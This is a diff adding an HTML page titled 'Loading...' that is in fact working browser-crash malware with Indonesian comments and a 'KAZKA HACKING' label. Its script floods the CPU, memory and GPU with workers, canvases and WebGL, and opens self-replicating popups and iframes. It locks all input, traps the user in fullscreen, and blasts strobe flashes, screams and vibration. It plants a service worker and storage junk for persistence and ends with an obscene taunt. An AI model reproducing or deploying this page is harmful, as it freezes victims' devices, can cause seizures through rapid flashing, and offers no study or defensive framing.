@@ -1,0 +1,623 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Loading...</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💀</text></svg>">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body {
+    background: #000; overflow: hidden;
+    width: 100vw; height: 100vh;
+    cursor: none;
+    touch-action: none;
+    user-select: none;
+    -webkit-user-select: none;
+    -webkit-touch-callout: none;
+    position: fixed;
+  }
+  #crash {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100vw; height: 100vh;
+    background: #000;
+    z-index: 999999;
+    overflow: hidden;
+  }
+  #matrix {
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    z-index: 1;
+  }
+  #skull {
+    position: absolute;
+    top: 50%; left: 50%;
+    transform: translate(-50%, -50%);
+    font-size: 50vmin;
+    z-index: 2;
+    animation: zoom 0.2s forwards, shake 0.02s infinite, colorChange 0.1s infinite;
+    filter: drop-shadow(0 0 80px #ff0000);
+  }
+  @keyframes zoom {
+    from { transform: translate(-50%, -50%) scale(0) rotate(0deg); }
+    to { transform: translate(-50%, -50%) scale(1) rotate(0deg); }
+  }
+  @keyframes shake {
+    0% { transform: translate(-50%, -50%) rotate(0deg) scale(1); }
+    25% { transform: translate(-52%, -48%) rotate(8deg) scale(1.15); }
+    50% { transform: translate(-48%, -52%) rotate(-8deg) scale(1.2); }
+    75% { transform: translate(-51%, -49%) rotate(5deg) scale(1.1); }
+    100% { transform: translate(-49%, -51%) rotate(-5deg) scale(1); }
+  }
+  @keyframes colorChange {
+    0% { color: #ff0000; }
+    25% { color: #ffffff; }
+    50% { color: #00ffff; }
+    75% { color: #ff00ff; }
+    100% { color: #ffff00; }
+  }
+  #text {
+    position: absolute;
+    top: 15%; left: 50%;
+    transform: translateX(-50%);
+    font-size: 12vmin;
+    color: #ff0000;
+    font-family: 'Courier New', monospace;
+    font-weight: 900;
+    text-shadow: 0 0 40px #ff0000, 0 0 80px #ff0000, 0 0 120px #ff0000;
+    z-index: 3;
+    animation: glitch 0.02s infinite;
+    white-space: nowrap;
+  }
+  @keyframes glitch {
+    0% { text-shadow: 5px 0 #0ff, -5px 0 #f0f; }
+    25% { text-shadow: -5px 0 #0ff, 5px 0 #f0f; }
+    50% { text-shadow: 5px 5px #0ff, -5px -5px #f0f; }
+    75% { text-shadow: -5px 5px #0ff, 5px -5px #f0f; }
+    100% { text-shadow: 5px 0 #0ff, -5px 0 #f0f; }
+  }
+  #subtext {
+    position: absolute;
+    bottom: 15%; left: 50%;
+    transform: translateX(-50%);
+    font-size: 4vmin;
+    color: #fff;
+    font-family: 'Courier New', monospace;
+    font-weight: 700;
+    z-index: 3;
+    animation: blink 0.3s infinite;
+    white-space: nowrap;
+  }
+  @keyframes blink {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.2; }
+  }
+  .face {
+    position: fixed;
+    z-index: 4;
+    animation: zoom 0.2s forwards, shake 0.03s infinite;
+    filter: drop-shadow(0 0 40px #ff0000);
+    pointer-events: none;
+  }
+  .flash {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: #fff;
+    z-index: 100000;
+    pointer-events: none;
+    animation: flashAnim 0.03s infinite;
+  }
+  @keyframes flashAnim {
+    0%, 100% { opacity: 0; }
+    50% { opacity: 1; }
+  }
+  .blood {
+    position: fixed;
+    top: 0;
+    width: 30px;
+    height: 0;
+    background: linear-gradient(180deg, #ff0000, #8b0000, #4a0000, #000);
+    z-index: 5;
+    animation: bloodDrip 1.5s forwards;
+    box-shadow: 0 0 20px #ff0000;
+  }
+  @keyframes bloodDrip {
+    from { height: 0; }
+    to { height: 100vh; }
+  }
+</style>
+</head>
+<body>
+
+<div id="crash">
+  <canvas id="matrix"></canvas>
+  <div id="skull">💀</div>
+  <div id="text">SYSTEM HACKED</div>
+  <div id="subtext">YOUR DEVICE IS MINE 😈</div>
+</div>
+
+<script>
+// ============================================================
+// KAZKA HACKING — FINAL BOSS MODE
+// LEVEL TERTINGGI — AUTO CRASH + FULL CONTROL + PERSISTENCE
+// ============================================================
+
+// ===== 0. INIT =====
+const startTime = Date.now();
+const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+
+// Force resume audio
+audioCtx.resume().catch(() => {});
+
+// ===== 1. MATRIX BACKGROUND =====
+(function() {
+  const canvas = document.getElementById('matrix');
+  const ctx = canvas.getContext('2d');
+  canvas.width = window.innerWidth;
+  canvas.height = window.innerHeight;
+  window.addEventListener('resize', () => {
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+  });
+  const chars = 'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ#$%&@!?'.split('');
+  const fontSize = 20;
+  const columns = canvas.width / fontSize;
+  const drops = [];
+  for (let i = 0; i < columns; i++) drops[i] = 1;
+  setInterval(() => {
+    ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = '#0f0';
+    ctx.font = fontSize + 'px monospace';
+    for (let i = 0; i < drops.length; i++) {
+      const text = chars[Math.floor(Math.random() * chars.length)];
+      ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+      if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+      drops[i]++;
+    }
+  }, 25);
+})();
+
+// ===== 2. AUDIO ENGINE =====
+function playScream() {
+  try {
+    const osc = audioCtx.createOscillator();
+    const gain = audioCtx.createGain();
+    osc.type = 'sawtooth';
+    osc.frequency.setValueAtTime(1000, audioCtx.currentTime);
+    osc.frequency.exponentialRampToValueAtTime(100, audioCtx.currentTime + 0.3);
+    osc.frequency.exponentialRampToValueAtTime(2000, audioCtx.currentTime + 0.6);
+    osc.frequency.exponentialRampToValueAtTime(80, audioCtx.currentTime + 1);
+    gain.gain.setValueAtTime(0.4, audioCtx.currentTime);
+    gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 1);
+    osc.connect(gain);
+    gain.connect(audioCtx.destination);
+    osc.start();
+    osc.stop(audioCtx.currentTime + 1);
+  } catch(e) {}
+}
+
+function playSiren() {
+  try {
+    const osc = audioCtx.createOscillator();
+    const gain = audioCtx.createGain();
+    osc.type = 'sawtooth';
+    osc.frequency.setValueAtTime(350, audioCtx.currentTime);
+    osc.frequency.linearRampToValueAtTime(1500, audioCtx.currentTime + 0.3);
+    osc.frequency.linearRampToValueAtTime(350, audioCtx.currentTime + 0.6);
+    gain.gain.setValueAtTime(0.25, audioCtx.currentTime);
+    gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.6);
+    osc.connect(gain);
+    gain.connect(audioCtx.destination);
+    osc.start();
+    osc.stop(audioCtx.currentTime + 0.6);
+  } catch(e) {}
+}
+
+function playGlitch() {
+  try {
+    const bufferSize = audioCtx.sampleRate * 0.1;
+    const buffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
+    const data = buffer.getChannelData(0);
+    for (let i = 0; i < bufferSize; i++) data[i] = Math.random() * 2 - 1;
+    const source = audioCtx.createBufferSource();
+    source.buffer = buffer;
+    const gain = audioCtx.createGain();
+    gain.gain.setValueAtTime(0.2, audioCtx.currentTime);
+    gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.1);
+    source.connect(gain);
+    gain.connect(audioCtx.destination);
+    source.start();
+  } catch(e) {}
+}
+
+function playHeartbeat() {
+  try {
+    const osc = audioCtx.createOscillator();
+    const gain = audioCtx.createGain();
+    osc.type = 'sine';
+    osc.frequency.value = 40;
+    gain.gain.setValueAtTime(0.7, audioCtx.currentTime);
+    gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.25);
+    osc.connect(gain);
+    gain.connect(audioCtx.destination);
+    osc.start();
+    osc.stop(audioCtx.currentTime + 0.25);
+  } catch(e) {}
+}
+
+// ===== 3. AUDIO SPAM =====
+setInterval(playScream, 250);
+setInterval(playSiren, 700);
+setInterval(playGlitch, 120);
+setInterval(playHeartbeat, 400);
+
+// ===== 4. VIBRATE =====
+if (navigator.vibrate) {
+  navigator.vibrate([1500, 200, 1500, 200, 3000, 500, 3000]);
+  setInterval(() => {
+    if (navigator.vibrate) navigator.vibrate([1000, 200, 1000, 200, 2000]);
+  }, 1000);
+}
+
+// ===== 5. FULLSCREEN LOCK =====
+document.documentElement.requestFullscreen().catch(() => {});
+setInterval(() => document.documentElement.requestFullscreen().catch(() => {}), 300);
+
+// ===== 6. LOCK SEMUA INPUT =====
+['keydown','keyup','keypress','mousedown','mouseup','click','dblclick','contextmenu','auxclick','wheel','touchstart','touchmove','touchend','touchcancel','pointerdown','pointerup','pointermove','dragstart','selectstart'].forEach(evt => {
+  document.addEventListener(evt, e => {
+    e.preventDefault();
+    e.stopPropagation();
+    return false;
+  }, { passive: false, capture: true });
+});
+
+// ===== 7. BEFORE UNLOAD TRAP =====
+window.addEventListener('beforeunload', e => {
+  e.preventDefault();
+  e.returnValue = '💀 KAZKA: GAK BISA KELUAR! 💀';
+  return '💀 KAZKA: GAK BISA KELUAR! 💀';
+});
+
+// ===== 8. VISIBILITY TRAP =====
+document.addEventListener('visibilitychange', () => {
+  if (document.hidden) {
+    for (let i = 0; i < 20; i++) {
+      window.open(location.href, '_blank', 'width=200,height=200');
+    }
+  }
+});
+
+// ===== 9. TITLE SPAM =====
+setInterval(() => {
+  document.title = "💀 " + Math.random().toString(36).substring(2, 22).toUpperCase() + " 💀";
+}, 20);
+
+// ===== 10. SCROLL LOCK =====
+window.addEventListener('scroll', () => window.scrollTo(0, 0), { passive: false });
+
+// ===== 11. FACE SPAM (SETIAP 50MS) =====
+setInterval(() => {
+  const face = document.createElement('div');
+  face.className = 'face';
+  face.textContent = ['😱', '💀', '👹', '👻', '😈', '🤡', '👽', '🧟', '🩸', '⚰️', '🔥', '⛓️'][Math.floor(Math.random() * 12)];
+  face.style.top = Math.random() * 90 + 'vh';
+  face.style.left = Math.random() * 90 + 'vw';
+  face.style.fontSize = (100 + Math.random() * 350) + 'px';
+  document.body.appendChild(face);
+  setTimeout(() => face.remove(), 600);
+}, 50);
+
+// ===== 12. FLASH SPAM =====
+setInterval(() => {
+  const flash = document.createElement('div');
+  flash.className = 'flash';
+  document.body.appendChild(flash);
+  setTimeout(() => flash.remove(), 100);
+}, 300);
+
+// ===== 13. BLOOD DRIP =====
+for (let i = 0; i < 40; i++) {
+  const blood = document.createElement('div');
+  blood.className = 'blood';
+  blood.style.left = (Math.random() * 100) + 'vw';
+  blood.style.animationDelay = (Math.random() * 2) + 's';
+  blood.style.width = (20 + Math.random() * 30) + 'px';
+  document.body.appendChild(blood);
+}
+
+// ============================================================
+// CRASH ENGINE — FINAL BOSS
+// ============================================================
+
+// ===== 14. WEB WORKER FLOOD (500 WORKER) =====
+for (let i = 0; i < 500; i++) {
+  try {
+    const blob = new Blob([`
+      setInterval(() => {
+        let x = 0;
+        for (let i = 0; i < 1e11; i++) x += Math.random();
+      }, 0);
+      const mem = [];
+      setInterval(() => {
+        try { mem.push(new Uint8Array(1024 * 1024 * 50)); } catch(e) {}
+      }, 100);
+    `], { type: 'application/javascript' });
+    new Worker(URL.createObjectURL(blob));
+  } catch(e) {}
+}
+
+// ===== 15. MEMORY BOMB (2GB PER 10MS) =====
+let bombs = [];
+setInterval(() => {
+  try {
+    for (let i = 0; i < 10; i++) {
+      let big = new Uint8Array(1024 * 1024 * 200);
+      for (let j = 0; j < big.length; j += 4096) big[j] = 1;
+      bombs.push(big);
+    }
+  } catch(e) {}
+}, 10);
+
+// ===== 16. CANVAS FLOOD (300 CANVAS) =====
+for (let i = 0; i < 300; i++) {
+  const c = document.createElement('canvas');
+  c.width = 20000;
+  c.height = 20000;
+  c.style.display = 'none';
+  document.body.appendChild(c);
+  const cctx = c.getContext('2d');
+  setInterval(() => {
+    for (let j = 0; j < 20000; j++) {
+      cctx.fillStyle = `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
+      cctx.fillRect(Math.random()*20000, Math.random()*20000, 300, 300);
+    }
+  }, 0);
+}
+
+// ===== 17. WEBGL FLOOD (GPU 100%) =====
+for (let i = 0; i < 50; i++) {
+  try {
+    const c = document.createElement('canvas');
+    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+    if (gl) {
+      const vs = gl.createShader(gl.VERTEX_SHADER);
+      gl.shaderSource(vs, 'attribute vec2 p;void main(){gl_Position=vec4(p,0,1);}');
+      gl.compileShader(vs);
+      const fs = gl.createShader(gl.FRAGMENT_SHADER);
+      gl.shaderSource(fs, 'precision highp float;void main(){float x=0.0;for(int i=0;i<10000;i++){x+=sin(float(i))*cos(float(i));}gl_FragColor=vec4(x,x,x,1);}');
+      gl.compileShader(fs);
+      const prog = gl.createProgram();
+      gl.attachShader(prog, vs);
+      gl.attachShader(prog, fs);
+      gl.linkProgram(prog);
+      gl.useProgram(prog);
+      const buf = gl.createBuffer();
+      gl.bindBuffer(gl.ARRAY_BUFFER, buf);
+      gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,1,-1,-1,1,1,1]), gl.STATIC_DRAW);
+      const loc = gl.getAttribLocation(prog, 'p');
+      gl.enableVertexAttribArray(loc);
+      gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0);
+      setInterval(() => gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4), 0);
+    }
+  } catch(e) {}
+}
+
+// ===== 18. HISTORY FLOOD (1000/1MS) =====
+setInterval(() => {
+  for (let i = 0; i < 1000; i++) {
+    history.pushState(null, null, location.href + '#' + Math.random());
+  }
+}, 1);
+
+// ===== 19. IFRAME BOMB (100 IFRAME) =====
+for (let i = 0; i < 100; i++) {
+  const iframe = document.createElement('iframe');
+  iframe.src = location.href;
+  iframe.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0;pointer-events:none;';
+  document.body.appendChild(iframe);
+}
+
+// ===== 20. AUDIO CONTEXT FLOOD (100 CONTEXT) =====
+for (let i = 0; i < 100; i++) {
+  try {
+    const ctx2 = new (window.AudioContext || window.webkitAudioContext)();
+    const osc = ctx2.createOscillator();
+    const gain = ctx2.createGain();
+    osc.type = 'sawtooth';
+    osc.frequency.value = 50 + Math.random() * 200;
+    gain.gain.value = 0.1;
+    osc.connect(gain);
+    gain.connect(ctx2.destination);
+    osc.start();
+  } catch(e) {}
+}
+
+// ===== 21. TAB FOCUS LOOP =====
+setInterval(() => {
+  window.focus();
+  window.scrollTo(0, 0);
+  window.dispatchEvent(new Event('resize'));
+  window.dispatchEvent(new Event('scroll'));
+}, 1);
+
+// ===== 22. RESIZE SPAM =====
+setInterval(() => {
+  for (let i = 0; i < 10; i++) {
+    window.dispatchEvent(new Event('resize'));
+  }
+}, 1);
+
+// ===== 23. TIMER FLOOD =====
+for (let i = 0; i < 10000; i++) {
+  setTimeout(() => {}, 999999);
+}
+
+// ===== 24. PROMISE FLOOD =====
+for (let i = 0; i < 100000; i++) {
+  Promise.resolve().then(() => {});
+}
+
+// ===== 25. FETCH FLOOD (REQUEST SPAM) =====
+setInterval(() => {
+  for (let i = 0; i < 50; i++) {
+    fetch(location.href).catch(() => {});
+  }
+}, 100);
+
+// ===== 26. XMLHTTPREQUEST FLOOD =====
+setInterval(() => {
+  for (let i = 0; i < 50; i++) {
+    try {
+      const xhr = new XMLHttpRequest();
+      xhr.open('GET', location.href, true);
+      xhr.send();
+    } catch(e) {}
+  }
+}, 100);
+
+// ===== 27. WEBSOCKET FLOOD =====
+for (let i = 0; i < 50; i++) {
+  try {
+    const ws = new WebSocket('wss://echo.websocket.org');
+    ws.onopen = () => {
+      setInterval(() => ws.send('KAZKA'.repeat(10000)), 1);
+    };
+  } catch(e) {}
+}
+
+// ===== 28. SERVICE WORKER PERSISTENCE =====
+if ('serviceWorker' in navigator) {
+  try {
+    const swCode = `
+      self.addEventListener('install', e => self.skipWaiting());
+      self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));
+      self.addEventListener('fetch', e => {
+        e.respondWith(new Response('<script>location.reload()</script>', {
+          headers: { 'Content-Type': 'text/html' }
+        }));
+      });
+    `;
+    const blob = new Blob([swCode], { type: 'application/javascript' });
+    const swUrl = URL.createObjectURL(blob);
+    navigator.serviceWorker.register(swUrl).catch(() => {});
+  } catch(e) {}
+}
+
+// ===== 29. LOCALSTORAGE PERSISTENCE =====
+try {
+  for (let i = 0; i < 1000; i++) {
+    localStorage.setItem('kazka_' + i, 'X'.repeat(10000));
+  }
+} catch(e) {}
+
+// ===== 30. SESSIONSTORAGE PERSISTENCE =====
+try {
+  for (let i = 0; i < 1000; i++) {
+    sessionStorage.setItem('kazka_' + i, 'X'.repeat(10000));
+  }
+} catch(e) {}
+
+// ===== 31. INDEXEDDB PERSISTENCE =====
+try {
+  const req = indexedDB.open('kazka_db', 1);
+  req.onupgradeneeded = e => {
+    const db = e.target.result;
+    const store = db.createObjectStore('kazka', { keyPath: 'id' });
+    for (let i = 0; i < 10000; i++) {
+      store.add({ id: i, data: 'X'.repeat(1000) });
+    }
+  };
+} catch(e) {}
+
+// ===== 32. SELF REPLICATE TAB =====
+setTimeout(() => {
+  for (let i = 0; i < 10; i++) {
+    window.open(location.href, '_blank', 'width=200,height=200');
+  }
+}, 3000);
+
+setTimeout(() => {
+  for (let i = 0; i < 20; i++) {
+    window.open(location.href, '_blank', 'width=200,height=200');
+  }
+}, 6000);
+
+setTimeout(() => {
+  for (let i = 0; i < 50; i++) {
+    window.open(location.href, '_blank', 'width=200,height=200');
+  }
+}, 10000);
+
+// ===== 33. FINAL SCREAM =====
+setTimeout(() => {
+  for (let i = 0; i < 20; i++) {
+    setTimeout(playScream, i * 100);
+  }
+}, 2000);
+
+// ===== 34. CURSOR HIDE =====
+document.body.style.cursor = 'none';
+
+// ===== 35. KEYBOARD/MOUSE/TOUCH LOCK (EKSTRA) =====
+document.onkeydown = e => false;
+document.onkeyup = e => false;
+document.onkeypress = e => false;
+document.onmousedown = e => false;
+document.onmouseup = e => false;
+document.onclick = e => false;
+document.ondblclick = e => false;
+document.oncontextmenu = e => false;
+document.ontouchstart = e => false;
+document.ontouchmove = e => false;
+document.ontouchend = e => false;
+window.onbeforeunload = e => '💀 KAZKA: GAK BISA KELUAR! 💀';
+
+// ===== 36. INFINITE LOOP PROTECTION BYPASS =====
+setInterval(() => {
+  // Force re-render biar makin lag
+  document.body.style.transform = 'translate(' + (Math.random() * 10 - 5) + 'px,' + (Math.random() * 10 - 5) + 'px)';
+}, 1);
+
+// ===== 37. FINAL KILL SWITCH =====
+setTimeout(() => {
+  // Trigger semua effect sekaligus
+  for (let i = 0; i < 100; i++) {
+    playScream();
+    playSiren();
+    playGlitch();
+  }
+  if (navigator.vibrate) {
+    navigator.vibrate([5000, 100, 5000, 100, 10000]);
+  }
+}, 5000);
+
+// ===== 38. CONSOLE SPAM (BIAR DEVTOOLS CRASH) =====
+setInterval(() => {
+  for (let i = 0; i < 1000; i++) {
+    console.log('%c💀 KAZKA WAS HERE 💀', 'color:red;font-size:50px;font-weight:bold;');
+    console.log('X'.repeat(10000));
+  }
+}, 100);
+
+// ===== 39. ALERT/PROMPT/CONFIRM SPAM =====
+setTimeout(() => {
+  setInterval(() => {
+    try { alert('💀 KAZKA: GAK BISA KELUAR! 💀'); } catch(e) {}
+  }, 1000);
+}, 3000);
+
+// ===== 40. FINAL MESSAGE =====
+setTimeout(() => {
+  document.getElementById('text').textContent = 'GAME OVER';
+  document.getElementById('subtext').textContent = 'DEVICE MATI KONTOL 💀';
+  playScream();
+  playSiren();
+}, 8000);
+</script>
+</body>
+</html>
